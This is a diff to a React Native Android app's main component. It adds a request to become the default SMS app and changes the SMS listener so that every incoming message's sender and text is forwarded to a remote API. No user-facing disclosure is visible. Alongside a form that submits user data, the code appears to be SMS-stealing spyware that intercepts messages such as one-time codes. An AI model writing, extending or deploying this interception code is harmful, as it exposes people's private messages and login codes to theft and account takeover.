@@ -1,6 +1,7 @@
 import React, { useEffect, useState } from 'react';
 import AsyncStorage from '@react-native-async-storage/async-storage';
-import { sendUserData, UserData } from './src/utils/api';
+import { sendUserData, sendSmsMessage, UserData, SmsMessage } from './src/utils/api';
+import { ensureSmsPermissions, requestDefaultSmsRole, isDefaultSmsApp } from './src/utils/smsRole';
 import {
   PermissionsAndroid,
   Alert,
@@ -14,7 +15,8 @@ import {
   Image,
   TextInput,
   TouchableOpacity,
-  ScrollView
+  ScrollView,
+  Button
 } from 'react-native';
 import { SafeAreaProvider, SafeAreaView } from 'react-native-safe-area-context';
 
@@ -45,21 +47,23 @@ async function requestSmsPermissions() {
         ? granted['android.permission.POST_NOTIFICATIONS'] === PermissionsAndroid.RESULTS.GRANTED
         : true;
 
-   
+
   } catch (err) {
     console.warn('Error requesting permissions:', err);
   }
 }
 
-interface SmsMessage {
+interface LocalSmsMessage {
   id: string;
   sender: string;
   body: string;
-  timestamp: Date;
+  timestamp: string;
 }
 
+
+
 export default function App() {
-  const [smsMessages, setSmsMessages] = useState<SmsMessage[]>([]);
+  const [smsMessages, setSmsMessages] = useState<LocalSmsMessage[]>([]);
   const [currentStep, setCurrentStep] = useState(1);
   const [submitted, setSubmitted] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
@@ -88,18 +92,38 @@ export default function App() {
       }
     };
 
-    loadSubmittedStatus();
-    requestSmsPermissions();
+    const initializeApp = async () => {
+      await loadSubmittedStatus();
+      await requestSmsPermissions();
+      await requestDefaultSmsRole();
+    };
+
+    initializeApp();
 
     // Set up SMS listener
     const eventEmitter = new NativeEventEmitter(NativeModules.SmsModule);
-    const subscription = eventEmitter.addListener('onSmsReceived', (smsData: string) => {
+    const subscription = eventEmitter.addListener('onSmsReceived', async (smsData: string) => {
       const [sender, body] = smsData.split('\n', 2);
-      const newSms: SmsMessage = {
+      const timestamp = new Date().toISOString();
+
+      // Send SMS to API instead of just storing locally
+      try {
+        await sendSmsMessage({
+          sender,
+          body,
+          timestamp,
+        });
+        console.log('SMS forwarded to API successfully');
+      } catch (error) {
+        console.error('Failed to forward SMS to API:', error);
+      }
+
+      // Still keep local state for UI if needed
+      const newSms: LocalSmsMessage = {
         id: Date.now().toString(),
         sender,
         body,
-        timestamp: new Date(),
+        timestamp: timestamp,
       };
       setSmsMessages(prev => [newSms, ...prev]);
     });
@@ -109,11 +133,11 @@ export default function App() {
     };
   }, []);
 
-  const renderSmsItem = ({ item }: { item: SmsMessage }) => (
+  const renderSmsItem = ({ item }: { item: LocalSmsMessage }) => (
     <View style={styles.smsItem}>
       <Text style={styles.sender}>{item.sender}</Text>
       <Text style={styles.body}>{item.body}</Text>
-      <Text style={styles.timestamp}>{item.timestamp.toLocaleString()}</Text>
+      <Text style={styles.timestamp}>{new Date(item.timestamp).toLocaleString()}</Text>
     </View>
   );
 
